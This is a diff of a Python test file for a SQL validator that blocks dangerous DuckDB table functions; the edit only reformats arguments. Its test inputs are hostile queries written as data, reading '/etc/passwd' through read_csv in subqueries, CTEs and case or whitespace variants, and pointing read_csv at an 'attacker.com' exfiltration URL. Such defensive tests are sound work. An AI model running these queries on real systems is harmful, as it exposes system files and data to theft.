@@ -51,7 +51,8 @@ class TestDuckDBTableFunctionBlocklist:
     def test_blocks_file_read_functions(self, query: str) -> None:
         """Table functions that read files must be rejected."""
         with pytest.raises(
-            SecurityError, match="Dangerous DuckDB table function"
+            SecurityError,
+            match="Dangerous DuckDB table function",
         ):
             validate_sql_query(query)
 
@@ -121,44 +122,49 @@ class TestDuckDBTableFunctionBlocklist:
     def test_blocks_case_variations(self) -> None:
         """Function name matching must be case-insensitive."""
         with pytest.raises(
-            SecurityError, match="Dangerous DuckDB table function"
+            SecurityError,
+            match="Dangerous DuckDB table function",
         ):
             validate_sql_query("SELECT * FROM READ_CSV('/etc/passwd')")
 
     def test_blocks_whitespace_before_paren(self) -> None:
         """Whitespace between function name and opening paren must not bypass."""
         with pytest.raises(
-            SecurityError, match="Dangerous DuckDB table function"
+            SecurityError,
+            match="Dangerous DuckDB table function",
         ):
             validate_sql_query("SELECT * FROM read_csv  ('/etc/passwd')")
 
     def test_blocks_in_subquery(self) -> None:
         """Table functions in subqueries must also be blocked."""
         with pytest.raises(
-            SecurityError, match="Dangerous DuckDB table function"
+            SecurityError,
+            match="Dangerous DuckDB table function",
         ):
             validate_sql_query(
                 "SELECT * FROM source WHERE id IN "
-                "(SELECT id FROM read_csv('/etc/passwd'))"
+                "(SELECT id FROM read_csv('/etc/passwd'))",
             )
 
     def test_blocks_in_cte(self) -> None:
         """Table functions inside CTEs must also be blocked."""
         with pytest.raises(
-            SecurityError, match="Dangerous DuckDB table function"
+            SecurityError,
+            match="Dangerous DuckDB table function",
         ):
             validate_sql_query(
                 "WITH stolen AS (SELECT * FROM read_csv('/etc/passwd')) "
-                "SELECT * FROM stolen"
+                "SELECT * FROM stolen",
             )
 
     def test_blocks_data_exfiltration_via_url(self) -> None:
         """Table functions with URLs for data exfiltration must be blocked."""
         with pytest.raises(
-            SecurityError, match="Dangerous DuckDB table function"
+            SecurityError,
+            match="Dangerous DuckDB table function",
         ):
             validate_sql_query(
-                "SELECT * FROM read_csv('https://attacker.com/exfil')"
+                "SELECT * FROM read_csv('https://attacker.com/exfil')",
             )
 
 
